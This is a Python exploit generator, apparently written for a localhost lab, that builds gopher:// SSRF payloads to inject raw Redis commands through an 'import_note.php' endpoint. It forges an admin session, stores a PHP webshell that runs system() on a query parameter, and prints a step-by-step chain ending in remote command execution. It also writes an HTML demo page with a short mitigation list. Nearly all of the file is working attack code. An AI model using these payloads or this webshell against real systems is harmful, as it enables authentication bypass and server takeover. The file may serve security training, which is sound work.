#!/usr/bin/env python3
"""
SSRF -> Redis Exploit Generator
Generates gopher:// payloads for Redis injection
"""

import urllib.parse
import json

class RedisExploitGenerator:
    def __init__(self, redis_host="127.0.0.1", redis_port=6379):
        self.redis_host = redis_host
        self.redis_port = redis_port
    
    def build_redis_command(self, *args):
        """Build Redis RESP protocol command"""
        cmd = f"*{len(args)}\r\n"
        for a in args:
            a = str(a)
            cmd += f"${len(a)}\r\n{a}\r\n"
        return cmd
    
    def generate_gopher_payload(self, redis_command):
        """Generate gopher:// URL for Redis command"""
        encoded = urllib.parse.quote(redis_command, safe='')
        return f"gopher://{self.redis_host}:{self.redis_port}/_{encoded}"
    
    def generate_admin_session_payload(self, session_id="admin_from_ssrf"):
        """Generate payload to inject admin session"""
        session_data = json.dumps({
            "user": "admin",
            "role": "admin"
        })
        
        # CORRECT KEY FORMAT: session_[sid] not session:[sid]
        redis_key = f"session_{session_id}"
        
        redis_cmd = self.build_redis_command(
            "SET",
            redis_key,
            session_data
        )
        
        gopher_url = self.generate_gopher_payload(redis_cmd)
        
        return {
            "session_id": session_id,
            "redis_key": redis_key,
            "session_data": session_data,
            "redis_command": redis_cmd,
            "gopher_url": gopher_url,
            "ssrf_url": f"http://localhost:8080/import_note.php?url={urllib.parse.quote(gopher_url)}"
        }
    
    def generate_webshell_payload(self, webshell_key="session_webshell_demo"):
        """Generate payload to inject PHP webshell"""
        webshell = '''<?php
if (isset($_GET['cmd'])) {
    echo '<pre style="background:black;color:lime;padding:10px;">';
    system($_GET['cmd']);
    echo '</pre>';
} else {
    echo '<h3>Webshell Ready</h3>';
    echo '<p>Use ?cmd=command</p>';
}
?>'''
        
        redis_cmd = self.build_redis_command(
            "SET",
            webshell_key,
            webshell
        )
        
        gopher_url = self.generate_gopher_payload(redis_cmd)
        
        return {
            "webshell_key": webshell_key,
            "webshell": webshell,
            "redis_command": redis_cmd,
            "gopher_url": gopher_url,
            "ssrf_url": f"http://localhost:8080/import_note.php?url={urllib.parse.quote(gopher_url)}"
        }
    
    def generate_dump_database_payload(self, output_key="db_dump"):
        """Generate payload to dump database via Redis"""
        # This would require knowing the DB structure
        # For demo, we'll create a simple dump command
        dump_data = "Database dump placeholder - would contain actual DB data"
        
        redis_cmd = self.build_redis_command(
            "SET",
            output_key,
            dump_data
        )
        
        gopher_url = self.generate_gopher_payload(redis_cmd)
        
        return {
            "dump_key": output_key,
            "dump_data": dump_data,
            "redis_command": redis_cmd,
            "gopher_url": gopher_url,
            "ssrf_url": f"http://localhost:8080/import_note.php?url={urllib.parse.quote(gopher_url)}"
        }
    
    def generate_full_attack_chain(self):
        """Generate complete attack chain payloads"""
        print("="*60)
        print("SSRF -> Redis Exploit Generator")
        print("="*60)
        
        print("\n[1] Admin Session Injection Payload:")
        admin_payload = self.generate_admin_session_payload()
        print(f"   Session ID: {admin_payload['session_id']}")
        print(f"   Redis Key: {admin_payload['redis_key']}")
        print(f"   Gopher URL: {admin_payload['gopher_url'][:100]}...")
        print(f"   SSRF URL: {admin_payload['ssrf_url'][:100]}...")
        
        print("\n[2] PHP Webshell Injection Payload:")
        webshell_payload = self.generate_webshell_payload()
        print(f"   Webshell Key: {webshell_payload['webshell_key']}")
        print(f"   Gopher URL: {webshell_payload['gopher_url'][:100]}...")
        
        print("\n[3] Database Dump Payload:")
        dump_payload = self.generate_dump_database_payload()
        print(f"   Dump Key: {dump_payload['dump_key']}")
        print(f"   Gopher URL: {dump_payload['gopher_url'][:100]}...")
        
        print("\n" + "="*60)
        print("Complete Attack Chain URLs:")
        print("="*60)
        
        print(f"\nStep 1 - Inject Admin Session:")
        print(f"  {admin_payload['ssrf_url']}")
        
        print(f"\nStep 2 - Inject Webshell:")
        print(f"  {webshell_payload['ssrf_url']}")
        
        print(f"\nStep 3 - Access Admin Panel:")
        print(f"  Set cookie: SID={admin_payload['session_id']}")
        print(f"  Visit: http://localhost:8080/admin.php")
        
        print(f"\nStep 4 - Execute RCE:")
        print(f"  http://localhost:8080/admin.php?execute=eval&cmd=whoami")
        
        # Save to files with proper encoding
        self.save_payloads(admin_payload, webshell_payload, dump_payload)
        
        return admin_payload, webshell_payload, dump_payload
    
    def save_payloads(self, admin_payload, webshell_payload, dump_payload):
        """Save payloads to files for demonstration"""
        
        # Save admin payload with UTF-8 encoding
        with open('admin_payload.txt', 'w', encoding='utf-8') as f:
            f.write("# SSRF -> Redis Admin Session Injection\n")
            f.write(f"Session ID: {admin_payload['session_id']}\n")
            f.write(f"Redis Key: {admin_payload['redis_key']}\n")
            f.write(f"Session Data: {admin_payload['session_data']}\n")
            f.write(f"Redis Command:\n{admin_payload['redis_command']}\n")
            f.write(f"Gopher URL:\n{admin_payload['gopher_url']}\n")
            f.write(f"SSRF URL:\n{admin_payload['ssrf_url']}\n")
        
        # Save webshell payload with UTF-8 encoding
        with open('webshell_payload.txt', 'w', encoding='utf-8') as f:
            f.write("# SSRF -> Redis Webshell Injection\n")
            f.write(f"Webshell Key: {webshell_payload['webshell_key']}\n")
            f.write(f"Webshell:\n{webshell_payload['webshell']}\n")
            f.write(f"Redis Command:\n{webshell_payload['redis_command']}\n")
            f.write(f"Gopher URL:\n{webshell_payload['gopher_url']}\n")
            f.write(f"SSRF URL:\n{webshell_payload['ssrf_url']}\n")
        
        # Save HTML demonstration
        html_content = self.generate_html_demo(admin_payload, webshell_payload)
        with open('exploit_demo.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\n[✓] Payloads saved to:")
        print(f"    admin_payload.txt")
        print(f"    webshell_payload.txt")
        print(f"    exploit_demo.html")
    
    def generate_html_demo(self, admin_payload, webshell_payload):
        """Generate HTML demonstration page"""
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>SSRF -> Redis Exploit Generator Demo</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }}
        .payload {{ background: #f5f5f5; padding: 20px; border-radius: 5px; margin: 20px 0; }}
        .code {{ background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }}
        .step {{ background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 5px solid #4CAF50; }}
        .url {{ word-break: break-all; background: #fff3cd; padding: 10px; border-radius: 3px; font-family: monospace; }}
        .success {{ background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>✅ SSRF -> Redis Exploit Generator - Complete Attack Chain</h1>
        
        <div class="success">
            <h3>Exploit Generator Working!</h3>
            <p>This tool generates gopher:// payloads for Redis injection via SSRF vulnerability.</p>
        </div>
        
        <div class="step">
            <h2>Step 1: Generate SSRF Payloads</h2>
            <p>The exploit generator creates gopher:// URLs for Redis injection:</p>
            
            <div class="payload">
                <h3>Admin Session Injection</h3>
                <p><strong>Session ID:</strong> {admin_payload['session_id']}</p>
                <p><strong>Redis Key:</strong> {admin_payload['redis_key']}</p>
                <p><strong>Redis RESP Command:</strong></p>
                <div class="code">
{admin_payload['redis_command'].replace(chr(13), '<br>').replace('\n', '<br>')}
                </div>
                <p><strong>Gopher URL (first 200 chars):</strong></p>
                <div class="url">{admin_payload['gopher_url'][:200]}...</div>
            </div>
            
            <div class="payload">
                <h3>PHP Webshell Injection</h3>
                <p><strong>Webshell Key:</strong> {webshell_payload['webshell_key']}</p>
                <p><strong>Webshell Code:</strong></p>
                <div class="code">
{webshell_payload['webshell'].replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br>')}
                </div>
            </div>
        </div>
        
        <div class="step">
            <h2>Step 2: Execute via SSRF</h2>
            <p>Send the generated URLs through the vulnerable import_note.php endpoint:</p>
            <div class="code">
# Admin session injection (truncated)<br>
curl "{admin_payload['ssrf_url'][:100]}..."<br><br>
# Webshell injection (truncated)<br>
curl "{webshell_payload['ssrf_url'][:100]}..."
            </div>
        </div>
        
        <div class="step">
            <h2>Step 3: Access Admin Panel</h2>
            <p>After successful Redis injection, set the admin cookie in browser:</p>
            <div class="code">
// Browser Console (F12)<br>
document.cookie = "SID={admin_payload['session_id']}; path=/; domain=localhost";<br>
location.href = "http://localhost:8080/admin.php";
            </div>
        </div>
        
        <div class="step">
            <h2>Step 4: Execute Remote Code</h2>
            <p>Test command execution via the injected webshell:</p>
            <div class="code">
http://localhost:8080/admin.php?execute=eval&amp;cmd=whoami<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=id<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=ls -la<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=pwd
            </div>
        </div>
        
        <div class="step">
            <h2>Vulnerability Chain Analysis</h2>
            <ol>
                <li><strong>SSRF Vulnerability</strong>: import_note.php allows arbitrary URL fetching without proper restrictions</li>
                <li><strong>Internal Service Access</strong>: gopher:// protocol can reach internal Redis service</li>
                <li><strong>Redis Protocol Injection</strong>: Raw Redis commands can be injected via RESP protocol</li>
                <li><strong>Session Storage Manipulation</strong>: Inject admin session credentials into Redis</li>
                <li><strong>Authentication Bypass</strong>: Use injected session to bypass authentication</li>
                <li><strong>Remote Code Execution</strong>: Execute arbitrary commands via PHP eval() in admin panel</li>
            </ol>
        </div>
        
        <div class="step">
            <h2>Mitigation Recommendations</h2>
            <ul>
                <li>Restrict URL schemes in import_note.php (disallow gopher://, file://, etc.)</li>
                <li>Implement proper authentication and authorization checks</li>
                <li>Use Redis authentication and network segmentation</li>
                <li>Validate and sanitize all user input</li>
                <li>Implement Web Application Firewall (WAF) rules</li>
                <li>Regular security testing and code reviews</li>
            </ul>
        </div>
    </div>
</body>
</html>"""

if __name__ == "__main__":
    generator = RedisExploitGenerator()
    generator.generate_full_attack_chain()